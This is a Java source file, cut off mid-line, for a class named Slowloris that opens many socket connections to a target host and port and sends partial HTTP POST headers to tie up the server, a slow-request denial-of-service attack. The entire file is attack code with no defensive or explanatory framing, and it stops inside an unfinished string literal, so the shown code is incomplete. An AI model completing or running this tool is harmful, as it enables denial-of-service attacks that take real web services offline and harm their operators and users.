import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class Slowloris {
    private String targetHost;
    private int targetPort;
    private int connectionCount;
    private long headerIntervalMillis;

    public Slowloris(String targetHost, int targetPort, int connectionCount, long headerIntervalMillis) {
        this.targetHost = targetHost;
        this.targetPort = targetPort;
        this.connectionCount = connectionCount;
        this.headerIntervalMillis = headerIntervalMillis;
    }

    public void attack() {
        List<Socket> sockets = new ArrayList<>();
        try {
            for (int i = 0; i < connectionCount; i++) {
                try {
                    Socket socket = new Socket(targetHost, targetPort);
                    PrintWriter writer = new PrintWriter(socket.getOutputStream());
                    
                    // Send initial part of the request
                    writer.print("POST / HTTP/1.1\r\n");
                    writer.print("Host: " + targetHost + "\r\n");
                    writer.print("
